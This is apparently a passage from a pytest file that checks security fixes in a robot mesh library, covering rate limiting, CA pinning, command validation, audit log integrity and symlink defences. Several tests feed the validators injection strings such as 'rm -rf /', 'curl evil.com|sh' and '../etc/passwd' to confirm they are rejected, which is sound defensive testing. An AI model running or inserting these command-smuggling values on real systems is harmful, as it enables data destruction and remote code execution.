    assert consume_indent <= with_indent, (
        "bucket.consume(...) is still inside `with _PEER_RATE_LOCK:` — "
        "this serialises every per-sender check across the whole process. "
        "Move the consume call OUTSIDE the with block (TokenBucket has its "
        "own internal lock)."
    )


def test_r3_3_declined_hitl_approval_does_not_consume_rate_slot():
    """R3-3: a declined operator approval must NOT consume a slot in the
    sliding-window rate-limit history.

    Without the split between check-and-record, three nuisance LLM
    prompts an operator declines within a minute would lock the agent
    out of issuing a real ``emergency_stop`` (capped at 3/min). The
    rate limit exists to bound LLM-driven nuisance, not to inhibit a
    genuine emergency.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    # Unwrap the @tool-decorated callable (existing pattern in this file).
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response="n")  # operator declines every time

    # Decline 3 emergency_stops in a row (the cap is 3/min).
    for _ in range(3):
        result = fn(action="emergency_stop", tool_context=ctx)
        assert result["status"] == "error"
        assert "declined" in result["content"][0]["text"]

    # The history bucket must STILL be empty because every approval was
    # declined — no slot consumed.
    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("emergency_stop")
        assert bucket is None or len(bucket) == 0, (
            "Declined approvals consumed rate-limit slots — a genuine "
            "emergency_stop is now locked out for up to 60s. R3-3 reopened."
        )

    # And a 4th attempt — also declined — must STILL not be rate-limited
    # (the rejection reason must say "declined", not "rate limit").
    result = fn(action="emergency_stop", tool_context=ctx)
    assert result["status"] == "error"
    text = result["content"][0]["text"].lower()
    assert "declined" in text
    assert "rate limit" not in text


def test_r3_3_approved_hitl_action_consumes_slot():
    """R3-3 (cont.): an APPROVED action must consume a slot — otherwise
    LLM-driven nuisance is unbounded.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response="y")  # operator approves

    # Patch _resolve_mesh to a stub mesh so the approved action can run
    # without an actual networked mesh.
    stub_mesh = MagicMock()
    stub_mesh.emergency_stop.return_value = []
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
        result = fn(action="emergency_stop", tool_context=ctx)

    # The action ran (operator approved) — slot must be recorded.
    assert result["status"] == "success", f"approved emergency_stop should succeed, got {result}"
    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("emergency_stop")
        assert bucket is not None and len(bucket) == 1, (
            "Approved emergency_stop did NOT consume a rate-limit slot — "
            "LLM nuisance is now unbounded. R3-3 (record path) reopened."
        )


def test_r3_3_non_interrupt_action_consumes_slot():
    """R3-3: actions that do NOT require an interrupt (e.g. ``tell``)
    must consume a slot unconditionally — matching the pre-split
    behaviour for non-fleet-wide actions.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx()

    stub_mesh = MagicMock()
    stub_mesh.tell.return_value = "tell-result"
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
        fn(action="tell", target="x", instruction="hi", tool_context=ctx)

    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("tell")
        assert bucket is not None and len(bucket) == 1


def test_r3_4_provision_existing_ca_always_raw_pin_checked(tmp_path, monkeypatch):
    """R3-4: When a CA file already exists on disk, ``_ensure_ca`` MUST
    always do the raw hash compare regardless of
    ``STRANDS_MESH_DISABLE_CA_PIN``. The break-glass exists for the
    *download* path (re-encoding proxies); silently re-using a rogue
    CA from a prior compromised provisioning run is strictly worse than
    re-fetching every time.
    """
    from strands_robots.mesh.iot import provision

    # Set the break-glass loud and clear.
    monkeypatch.setenv("STRANDS_MESH_DISABLE_CA_PIN", "true")

    # Plant a rogue CA file at the canonical location.
    ca_path = tmp_path / "AmazonRootCA1.pem"
    ca_path.write_bytes(b"-----BEGIN ROGUE CA-----\nfake bytes\n-----END ROGUE CA-----\n")

    # Even with the break-glass set, the existing-file branch must
    # raise — defending against the silent-rogue-reuse attack.
    with pytest.raises(RuntimeError, match="failed pin check"):
        provision._ensure_ca(ca_path)

    # The file must still be on disk (we don't auto-delete; the caller
    # must do that explicitly).
    assert ca_path.exists()


def test_r3_5_validate_command_blocks_pretrained_name_or_path(monkeypatch):
    """R3-5: ``validate_command`` must reject ``pretrained_name_or_path``
    that doesn't match the HF org allowlist, even on otherwise valid
    execute/start commands. Threat-vector #3 is reachable via this kwarg
    without the gate.
    """
    monkeypatch.delenv("STRANDS_MESH_HF_REPO_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "do thing",
        "policy_host": "localhost",
    }

    # Default allowlist accepts known-good orgs (lerobot, nvidia, huggingface).
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0"))
    assert ok["pretrained_name_or_path"] == "lerobot/pi0"

    # Attacker-controlled org must be rejected.
    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="evil-corp/backdoor-model"))

    # Path traversal must be rejected.
    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/../evil/x"))

    # Shell metacharacters must be rejected.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0; rm -rf /"))


def test_r3_5_validate_command_hf_repo_allow_extends(monkeypatch):
    """R3-5: ``STRANDS_MESH_HF_REPO_ALLOW`` extends the org allowlist."""
    from strands_robots.mesh import security as sec

    monkeypatch.setenv("STRANDS_MESH_HF_REPO_ALLOW", "my-org,trusted-team/specific-model")

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Org-prefix allow → all repos under my-org/ pass.
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="my-org/whatever"))
    assert ok["pretrained_name_or_path"] == "my-org/whatever"

    # Specific full prefix allow → only that prefix.
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/specific-model"))
    assert ok["pretrained_name_or_path"] == "trusted-team/specific-model"

    # Different repo from the allowed team is NOT auto-allowed.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/other-model"))


def test_r3_5_validate_command_blocks_model_path_traversal():
    """R3-5: ``model_path`` rejects shell metacharacters and ``..``
    traversal segments even when not requiring HF org match."""
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Plain local path is OK.
    ok = sec.validate_command(dict(base_cmd, model_path="/opt/models/my-model"))
    assert ok["model_path"] == "/opt/models/my-model"

    # Path traversal is NOT.
    with pytest.raises(sec.ValidationError, match="model_path"):
        sec.validate_command(dict(base_cmd, model_path="/opt/../etc/passwd"))

    # Shell metacharacters are NOT.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, model_path="/tmp/m;curl evil.com|sh"))

    # NUL bytes / control characters are NOT.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, model_path="/tmp/m\x00malicious"))


def test_r3_5_validate_command_blocks_unknown_policy_type():
    """R3-5: ``policy_type`` rejects values not in the allowlist."""
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    ok = sec.validate_command(dict(base_cmd, policy_type="act"))
    assert ok["policy_type"] == "act"

    ok = sec.validate_command(dict(base_cmd, policy_type="MOCK"))
    assert ok["policy_type"] == "mock"  # canonicalised lowercase

    with pytest.raises(sec.ValidationError, match="policy_type"):
        sec.validate_command(dict(base_cmd, policy_type="evil_remote_exec"))


def test_r3_5_validate_command_blocks_server_address_offnet(monkeypatch):
    """R3-5: ``server_address`` must check the host against the policy-host
    allowlist. The default allowlist is loopback only, so an external
    IP must be rejected unless ``STRANDS_MESH_POLICY_HOST_ALLOW`` permits.
    """
    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Loopback OK.
    ok = sec.validate_command(dict(base_cmd, server_address="tcp://127.0.0.1:5555"))
    assert ok["server_address"].endswith(":5555")

    # Off-network blocked.
    with pytest.raises(sec.ValidationError, match="server_address"):
        sec.validate_command(dict(base_cmd, server_address="tcp://198.51.100.1:5555"))

    # ALSO blocked: looks like loopback but is actually a hostname trick.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, server_address="tcp://attacker.example.com:5555"))


def test_r3_6_audit_seq_loaded_lives_on_state_object():
    """R3-6: ``_SEQ_LOADED`` was refactored onto ``_AUDIT_STATE.seq_loaded``
    so static analysers don't trip on a bare ``global`` for a module-
    level scalar (CodeQL #222).
    """
    from strands_robots.mesh import audit

    assert hasattr(audit, "_AUDIT_STATE"), "the refactor must expose _AUDIT_STATE"
    assert hasattr(audit._AUDIT_STATE, "seq_loaded")
    # Defensive: legacy scalar must not be reintroduced.
    assert not hasattr(audit, "_SEQ_LOADED"), (
        "Legacy _SEQ_LOADED scalar reintroduced — CodeQL #222 will reopen. Use _AUDIT_STATE.seq_loaded."
    )


def test_r3_7_persist_seq_chmod_failure_documented():
    """R3-7: the chmod best-effort except-pass in ``_persist_seq_counters``
    has an explanatory comment so CodeQL #225 stays closed.

    Updated for Phase-4 / F3 — _persist_seq_counters now contains
    multiple except blocks (the new symlink-defence path + the original
    chmod best-effort block). We specifically pin the *chmod* block by
    searching downward FROM the chmod call.
    """
    import inspect

    from strands_robots.mesh import audit

    src = inspect.getsource(audit._persist_seq_counters)
    # Find the chmod block.
    chmod_idx = src.index("os.chmod(sidecar, 0o600)")
    tail = src[chmod_idx:]
    # The except clause that wraps chmod must be followed by a
    # comment before `pass`. Look for "except OSError:" and the
    # immediate-next-non-blank line.
    except_pos = tail.index("except OSError:")
    after = tail[except_pos:].splitlines()
    # after[0] is `except OSError:`; after[1..] should include at least
    # one comment line before any `pass` statement.
    has_comment_before_pass = False
    for line in after[1:8]:
        stripped = line.strip()
        if not stripped:
            continue
        if stripped.startswith("#"):
            has_comment_before_pass = True
            break
        if stripped == "pass":
            break

    assert has_comment_before_pass, (
        "_persist_seq_counters chmod block has empty `except OSError: pass` "
        "with no explanatory comment — CodeQL #225 will reopen."
    )


def test_r3_8_sensors_loop_mixin_has_no_stray_docstring():
    """R3-8: ``SensorLoopsMixin`` had two consecutive docstrings, the
    second one parsed as a no-effect string-statement (CodeQL #224).
    Class body must contain only one (the first) docstring.
    """
    import ast
    import inspect

    from strands_robots.mesh import sensors

    src = inspect.getsource(sensors.SensorLoopsMixin)
    tree = ast.parse(src)
    cls = tree.body[0]
    assert isinstance(cls, ast.ClassDef)

    # Walk the class body and count bare string-expression statements.
    # The very first child can be a docstring; any *additional* string
    # expression is a CodeQL #224 statement-with-no-effect.
    stray_strings = []
    for i, node in enumerate(cls.body):
        if isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
            if i > 0:
                stray_strings.append(node.lineno)

    assert not stray_strings, (
        f"SensorLoopsMixin has {len(stray_strings)} stray string "
        f"expression(s) at lines {stray_strings} — CodeQL #224 will "
        "reopen. Move all class-level prose into the single first docstring."
    )


# ───────────────────────────────────────────────────────────────────────────
# Round 4 — additional review feedback from yinsong1986 (PR #194 round 4)
# ───────────────────────────────────────────────────────────────────────────


def test_r4_1_validate_command_blocks_unknown_policy_provider(monkeypatch):
    """R4-1: ``policy_provider`` is the registry key the receive-side
    ``_dispatch`` passes straight to ``_execute_task_sync``. Without
    validation, an authenticated peer could steer a robot to any
    registered provider — bypassing every other allowlist on this code
    path.
    """
    monkeypatch.delenv("STRANDS_MESH_POLICY_TYPE_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base = {"action": "execute", "instruction": "x", "policy_host": "localhost"}

    # Default "mock" must work (back-compat).
    ok = sec.validate_command(dict(base))
    assert ok["policy_provider"] == "mock"

    # Known providers from the default allowlist must work.
    for provider in ("groot", "lerobot_local", "act"):
        ok = sec.validate_command(dict(base, policy_provider=provider))
        assert ok["policy_provider"] == provider

    # Unknown provider must be rejected.
    with pytest.raises(sec.ValidationError, match="policy_provider"):
        sec.validate_command(dict(base, policy_provider="evil-corp/backdoor"))

    # Path traversal / shell metacharacters must be rejected.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base, policy_provider="mock; rm -rf /"))


def test_r4_1_validate_command_policy_provider_canonicalises_case():
    """R4-1: provider value is lower-cased on output (consistent with
    policy_type)."""
    from strands_robots.mesh import security as sec

    base = {"action": "execute", "instruction": "x", "policy_host": "localhost"}
    ok = sec.validate_command(dict(base, policy_provider="GROOT"))
    assert ok["policy_provider"] == "groot"


def test_r4_2_audit_psk_degrade_refused(monkeypatch, tmp_path):
    """R4-2: if STRANDS_MESH_AUDIT_PSK was set when the audit log first
    started signing this run, but is later unset, ``_sign_record`` must
    raise ``AuditPSKDegradedError`` and the record is dropped (logged
    at ERROR). An attacker who clears the env briefly to write
    unsigned forgeries cannot degrade integrity unnoticed.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "r4-2-psk")
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None  # snapshot fresh

    # First write — signed.
    audit.log_safety_event("e1", "p", {"i": 1})
    log_path = audit.audit_log_path()
    raw1 = log_path.read_text()
    assert '"sig"' in raw1, "first record must be signed"

    # Attacker clears the PSK env mid-run.
    monkeypatch.delenv("STRANDS_MESH_AUDIT_PSK", raising=False)

    # Second write — must be REFUSED (record dropped).
    audit.log_safety_event("e2_evil", "p", {"i": 2})
    raw2 = log_path.read_text()
    # Only the original record should be in the log.
    assert raw1 == raw2, (
        "Audit log accepted an unsigned record after PSK was cleared — "
        "R4-2 reopened. The forgery would have appeared in the log."
    )


def test_r4_2_verify_audit_integrity_fails_closed_when_psk_present_but_records_unsigned(monkeypatch, tmp_path):
    """R4-2: when a PSK is configured at verification time, an
    unsigned record is treated as a failure (`ok=False`).
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None

    # Phase 1: write unsigned (no PSK).
    monkeypatch.delenv("STRANDS_MESH_AUDIT_PSK", raising=False)
    audit.log_safety_event("e1_unsigned", "p", {"i": 1})

    # Phase 2: verify WITH PSK configured — must fail-closed.
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "r4-2-verify-psk")
    result = audit.verify_audit_integrity()
    assert result["psk_present"] is True
    assert result["missing_sig"] == 1
    assert result["ok"] is False, (
        "verify_audit_integrity reported ok=True with a PSK configured but unsigned records present — R4-2 reopened."
    )


def test_r4_3_seq_sidecar_uses_fsync(tmp_path, monkeypatch):
    """R4-3: ``_persist_seq_counters`` fsyncs the temp fd before
    rename and the parent dir afterwards on POSIX, so a power loss
    cannot leave the audit log ahead of the sidecar.

    We verify by source inspection — actually testing fsync semantics
    requires power-loss simulation, which is out of scope for unit
    tests. The presence of the calls is what the R4-3 finding asked
    for.
    """
    import inspect

    from strands_robots.mesh import audit

    src = inspect.getsource(audit._persist_seq_counters)
    assert "os.fsync(fh.fileno())" in src, "temp fd must be fsync'd before rename"
    assert "os.fsync(dir_fd)" in src, "parent dir must be fsync'd after rename"
    assert "os.O_RDONLY" in src, "parent dir is opened read-only for fsync"


def test_r4_4_ca_download_has_per_recv_timeout():
    """R4-4 + R7-2: ``_ensure_ca`` enforces a per-recv deadline on the
    CA download so a slow-loris responder cannot dribble bytes
    indefinitely.

    The original R4-4 fix used ``socket.setdefaulttimeout``
    (process-global mutation); R7-2 replaced that with a proper
    per-socket timeout via ``urllib.request.build_opener`` +
    ``HTTPSConnection(timeout=...)``, which is per-request only and
    never mutates the process default.
    """
    import inspect

    from strands_robots.mesh.iot import provision

    assert hasattr(provision, "_download_with_per_socket_timeout"), (
        "Per-recv deadline helper missing — R4-4 / R7-2 reopened."
    )
    helper_src = inspect.getsource(provision._download_with_per_socket_timeout)
    assert "build_opener" in helper_src, "Must use urllib.request.build_opener (R7-2)"
    assert "HTTPSConnection" in helper_src, "Must build HTTPSConnection with explicit timeout"

    # R7-2: the process-global mutation must NOT come back. We rely on a
    # source-text check after stripping comments via tokenize so the
    # docstring mentions of setdefaulttimeout (intentional, explaining
    # what we don't do) don't trip the assertion.
    import io
    import tokenize

    def _strip_to_code(text: str) -> str:
        out = []
        for tok in tokenize.generate_tokens(io.StringIO(text).readline):
            if tok.type in (tokenize.COMMENT, tokenize.STRING):
                continue
            out.append(tok.string)
        return " ".join(out)

    helper_code = _strip_to_code(helper_src)
    ensure_code = _strip_to_code(inspect.getsource(provision._ensure_ca))
    for code, label in [(helper_code, "helper"), (ensure_code, "_ensure_ca")]:
        assert "setdefaulttimeout" not in code, (
            f"{label} mutates socket.setdefaulttimeout — R7-2 reopened. "
            "Use a per-socket timeout via build_opener + HTTPSConnection."
        )


def test_r4_5_send_rejects_broadcast_responder_target(monkeypatch):
    """R4-5: ``Mesh.send`` rejects ``BROADCAST_RESPONDER`` (and any
    NUL-containing target) so a future refactor that loosens the
    peer_id regex cannot reopen the response-hijack surface.
    """
    monkeypatch.setenv("STRANDS_MESH_PSK", "r4-5-psk")
    import importlib

    from strands_robots.mesh import security as sec

    importlib.reload(sec)
    from strands_robots.mesh.core import BROADCAST_RESPONDER, Mesh

    sec.clear_replay_cache()

    m = Mesh(MagicMock(), peer_id="me")
    m._running = True

    out = m.send(BROADCAST_RESPONDER, {"action": "status"}, timeout=0.1)
    assert out["status"] == "error"
    assert "BROADCAST_RESPONDER" in out["error"] or "NUL" in out["error"]

    out = m.send("with\x00nul", {"action": "status"}, timeout=0.1)
    assert out["status"] == "error"

    # And empty / non-string targets rejected.
    out = m.send("", {"action": "status"}, timeout=0.1)
    assert out["status"] == "error"


def test_r4_8_rate_limit_error_is_actually_raised(monkeypatch):
    """R4-8: ``RateLimitError`` is now wired into the structured boundary
    via ``enforce_peer_rate_limit``. AGENTS.md "no dead code" rule
    satisfied.
    """
    from strands_robots.mesh import security as sec

    # First call passes.
    sec.reset_peer_rate_limits()
    sec.enforce_peer_rate_limit("test-sender")

    # Burn through the bucket (default burst = 20).
    for _ in range(25):
        try:
            sec.enforce_peer_rate_limit("test-sender")
        except sec.RateLimitError as exc:
            # First raise tells us the wire actually exists.
            assert "test-sender" in str(exc)
            return
    pytest.fail("RateLimitError was never raised after 25 calls — burst cap broken or wire dead")


def test_r4_8_supersedes_authorization_error_deleted_per_r8_3():
    """R4-8 superseded by R8-3.

    R4-8 wired ``AuthorizationError`` into ``_on_response`` as a
    raise-then-immediately-catch around the response-hijack reject
    path. Yin's R8-3 follow-up flagged that as YAGNI scaffolding -
    the structured audit emit (``response_hijack_rejected``) plus
    the WARNING log already give forensic readers everything they
    need; the typed exception class never gained a real consumer.

    R8-3 deletes the class entirely. This test pins the deletion so
    a future refactor can not reintroduce a dead exception type.
    """
    import inspect

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    # R8-3: AuthorizationError must NOT exist as an exported class.
    assert not hasattr(sec, "AuthorizationError"), (
        "AuthorizationError reintroduced — R8-3 reopened. "
        "Yin's review: raise-then-immediately-catch is YAGNI; the "
        "structured audit event is the forensic channel."
    )
    assert "AuthorizationError" not in sec.__all__, "AuthorizationError still in __all__ — R8-3 reopened."

    # _on_response must not reference AuthorizationError any more.
    src = inspect.getsource(Mesh._on_response)
    assert "AuthorizationError" not in src, "_on_response still references AuthorizationError — R8-3 reopened."

    # The response-hijack reject path must still emit the typed audit
    # event - that is the forensic channel that survives.
    assert "response_hijack_rejected" in src


# ───────────────────────────────────────────────────────────────────────────
# Round 5 — senior-principal pass on PR #194
# ───────────────────────────────────────────────────────────────────────────


def test_r5_1_exec_cmd_turn_id_fallback_is_full_uuid(monkeypatch):
    """R5-1: receive-side turn_id fallback in _exec_cmd is full 128-bit
    uuid4().hex, not truncated to 8 hex (32-bit). Pre-fix was a
    birthday-collision / predictability surface mirroring the outbound
    D1 attack from the receive side.
    """
    import inspect

    from strands_robots.mesh.core import Mesh

    src = inspect.getsource(Mesh._exec_cmd)
    assert "uuid.uuid4().hex[:8]" not in src, (
        "_exec_cmd still truncates the turn_id fallback to 32 bits — R5-1 reopened. Use the full hex."
    )
    assert "uuid.uuid4().hex" in src


def test_r5_2_mesh_publish_is_public_alias_of_put_signed(monkeypatch):
    """R5-2: Mesh.publish is the public alias cross-module callers use.
    AGENTS.md > Public API Hygiene forbids referencing _methods from
    other modules. camera_offload now uses mesh.publish().
    """
    import inspect

    from strands_robots.mesh.core import Mesh

    assert hasattr(Mesh, "publish"), "Mesh.publish public alias missing — R5-2 reopened"
    publish_src = inspect.getsource(Mesh.publish)
    assert "_put_signed" in publish_src, "Mesh.publish must delegate to _put_signed"

    # camera_offload must use the public name now.
    from strands_robots.mesh.iot import camera_offload

    co_src = inspect.getsource(camera_offload)
    assert "mesh.publish(" in co_src, "camera_offload must call mesh.publish (R5-2)"
    assert "mesh._put_signed(" not in co_src, (
        "camera_offload still reaches into mesh._put_signed (private) — R5-2 reopened. "
        "Use the public Mesh.publish alias."
    )


def test_r5_3_seq_sidecar_uses_flock(monkeypatch):
    """R5-3: cross-process seq counter safety via fcntl.flock.

    Source-inspection check: _next_seq must call _seq_flock (the
    cross-process lock helper) and re-load the sidecar inside the
    flock so a peer process's increments are merged before we decide
    our next value.
    """
    import inspect

    from strands_robots.mesh import audit

    assert hasattr(audit, "_seq_flock"), "_seq_flock helper missing — R5-3 reopened"
    src = inspect.getsource(audit._next_seq)
    assert "_seq_flock" in src, "_next_seq must hold the cross-process flock"
    # Must reset seq_loaded inside the flock so we re-read.
    assert "seq_loaded = False" in src, (
        "_next_seq must invalidate the in-memory cache inside the flock "
        "and re-read the sidecar so peer-process increments are merged."
    )


def test_r5_3_concurrent_processes_do_not_roll_back_counter(tmp_path, monkeypatch):
    """R5-3 functional: simulate two writers by clearing in-memory state
    twice and verify the persistent sidecar's monotonicity holds.

    Real cross-process testing requires multiprocessing; we approximate
    by repeatedly clearing the in-memory cache (which is what a fresh
    process would see on startup) and checking that the seq counter
    never goes backwards.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "r5-3-psk")
    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None

    # Round 1: write 5 events (peer-a goes 1..5 in our process).
    for i in range(5):
        audit.log_safety_event("e", "peer-a", {"i": i})

    # Simulate "another process started" by clearing in-memory state.
    last_seen = audit._SEQ_COUNTERS.get("peer-a")
    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False

    # Next event MUST resume at 6 (sidecar reload inside flock).
    audit.log_safety_event("e_after", "peer-a", {"i": "after"})
    new_seq = audit._SEQ_COUNTERS.get("peer-a")
    assert new_seq == last_seen + 1, (
        f"Counter rolled back: was {last_seen}, now {new_seq}. "
        "R5-3 reopened — the flock+reload must merge persisted state."
    )


def test_r5_4_resume_lockout_response_is_generic(monkeypatch, tmp_path):
    """R5-4: every non-success branch of _resume_lockout returns the
    same generic shape so a remote prober cannot use response shapes
    as oracles for lockout state, override-code config, or duration.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="me")
    GENERIC_ERR = {"status": "error", "error": "resume rejected"}

    # Branch 1: lockout NOT engaged — generic error.
    assert m._resume_lockout("anything") == GENERIC_ERR

    # Branch 2: lockout engaged, override code unconfigured — generic error.
    m._estop_lockout.set()
    monkeypatch.delenv("STRANDS_MESH_OVERRIDE_CODE", raising=False)
    assert m._resume_lockout("any") == GENERIC_ERR

    # Branch 3: lockout engaged, wrong code — generic error.
    monkeypatch.setenv("STRANDS_MESH_OVERRIDE_CODE", "right-code")
    assert m._resume_lockout("wrong-code") == GENERIC_ERR

    # Branch 4: success — generic ok with NO duration leak.
    m._estop_lockout.set()  # re-engage
    m._last_estop_ts = 0.0  # would normally leak as lockout_elapsed_s
    result = m._resume_lockout("right-code")
    assert result == {"status": "ok"}
    assert "lockout_elapsed_s" not in result, (
        "Resume success leaks lockout duration on the wire — R5-4 reopened. "
        "Operators can read elapsed time from the local audit log."
    )


def test_r5_5_peer_rate_config_narrow_exception(monkeypatch):
    """R5-5: _peer_rate_config catches only (ValueError, IndexError),
    NOT bare Exception. AttributeError / TypeError from a real bug must
    surface."""
    import inspect

    from strands_robots.mesh import security as sec

    src = inspect.getsource(sec._peer_rate_config)
    # Forbid the bare except.
    assert "except Exception:" not in src, (
        "_peer_rate_config still catches bare Exception — R5-5 reopened. AGENTS.md > Exception Clauses Must Be Narrow."
    )
    # Must catch the specific cases.
    assert "ValueError" in src

    # Functional: garbage env still falls back to default.
    monkeypatch.setenv("STRANDS_MESH_PEER_RATE", "garbage")
    burst, window = sec._peer_rate_config()
    assert (burst, window) == (20, 60.0)

    # Empty.
    monkeypatch.setenv("STRANDS_MESH_PEER_RATE", "")
    burst, window = sec._peer_rate_config()
    assert (burst, window) == (20, 60.0)


# ───────────────────────────────────────────────────────────────────────────
# Round 7 — yinsong1986 review feedback
# ───────────────────────────────────────────────────────────────────────────


def test_r7_1_audit_log_create_refuses_symlink_target(tmp_path, monkeypatch):
    """R7-1: ``_ensure_paths`` no longer relies on a convoluted
    try/except OSError + re-check pattern, and the file-creation step
    uses ``os.open(O_NOFOLLOW)`` instead of ``Path.touch`` so a TOCTOU
    race that swaps a symlink between the static check and the create
    cannot redirect the create.

    Pre-fix: ``Path.touch`` follows symlinks, and the static check's
    rejection could be silently swallowed by the except branch's
    re-check returning False on a TOCTOU swap.
    """
    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    from strands_robots.mesh import audit

    # Plant a symlink at the canonical log path before _ensure_paths runs.
    log_path = audit.audit_log_path()
    attacker_sink = tmp_path / "attacker_sink.jsonl"
    log_path.symlink_to(attacker_sink)

    # _ensure_paths must reject up front, AND the attacker_sink must
    # not exist after the call (proving touch() / O_NOFOLLOW didn't
    # follow the symlink to create the target).
    with pytest.raises(OSError, match="SYMLINK"):
        audit._ensure_paths(log_path)
    assert not attacker_sink.exists(), (
        "Symlink target was created — R7-1 reopened. Path.touch() follows symlinks; use os.open(O_NOFOLLOW)."
    )


def test_r7_1_ensure_paths_uses_os_open_not_touch():
    """R7-1: the file-creation step inside ``_ensure_paths`` uses
    ``os.open(O_NOFOLLOW)``, not ``Path.touch``. ``Path.touch`` follows
    symlinks; on Windows where O_NOFOLLOW is 0 the static check is the
    only defence, so this check pins the structural fix."""
    import inspect

    from strands_robots.mesh import audit

    src = inspect.getsource(audit._ensure_paths)
    assert "path.touch()" not in src, (
        "_ensure_paths still uses Path.touch — R7-1 reopened. "
        "Path.touch follows symlinks; use os.open(O_NOFOLLOW) instead."
    )
    assert "O_NOFOLLOW" in src or 'getattr(os, "O_NOFOLLOW"' in src
    assert "O_CREAT" in src
    assert "O_EXCL" in src, "File creation must use O_EXCL so a parallel writer cannot win the race silently."


def test_r7_2_ca_download_does_not_mutate_socket_default():
    """R7-2: the CA download path uses a per-socket timeout via
    ``urllib.request.build_opener`` + ``HTTPSConnection(timeout=...)``,
    NOT ``socket.setdefaulttimeout`` (which is process-global).

    Pre-fix, every other thread doing socket I/O during the CA window
    observed the foreign 15s default — a real interaction surface for
    boto3 / Zenoh / requests.
    """
    import inspect
    import io
    import tokenize

    from strands_robots.mesh.iot import provision

    def _strip(text):
        out = []
        for tok in tokenize.generate_tokens(io.StringIO(text).readline):
            if tok.type in (tokenize.COMMENT, tokenize.STRING):
                continue
            out.append(tok.string)
        return " ".join(out)

    helper_code = _strip(inspect.getsource(provision._download_with_per_socket_timeout))
    ensure_code = _strip(inspect.getsource(provision._ensure_ca))

    for code, label in [(helper_code, "helper"), (ensure_code, "_ensure_ca")]:
        assert "setdefaulttimeout" not in code, f"{label} still calls socket.setdefaulttimeout — R7-2 reopened."
        assert "getdefaulttimeout" not in code, f"{label} still inspects socket.getdefaulttimeout — R7-2 reopened."

    # Helper must use the urllib opener + HTTPSConnection path.
    helper_src = inspect.getsource(provision._download_with_per_socket_timeout)
    assert "build_opener" in helper_src
    assert "HTTPSConnection" in helper_src


def test_r7_3_multi_pin_support_and_env_var(monkeypatch):
    """R7-3: ``_AMAZON_ROOT_CA1_PINS`` is a tuple and ``_resolve_ca_pins``
    accepts additional pins via ``STRANDS_MESH_CA_PINS`` (comma-separated
    64-char lowercase hex). Operators stage a future-rotation pin via
    env var; the built-in tuple is always included.
    """
    from strands_robots.mesh.iot import provision

    # Built-in tuple shape.
    assert isinstance(provision._AMAZON_ROOT_CA1_PINS, tuple)
    assert len(provision._AMAZON_ROOT_CA1_PINS) >= 1
    assert all(len(p) == 64 and all(c in "0123456789abcdef" for c in p) for p in provision._AMAZON_ROOT_CA1_PINS)

    # R8-10: the legacy `_AMAZON_ROOT_CA1_SHA256` alias was DELETED.
    # CodeQL #229 flagged it as unused after R7-3 wired every reader
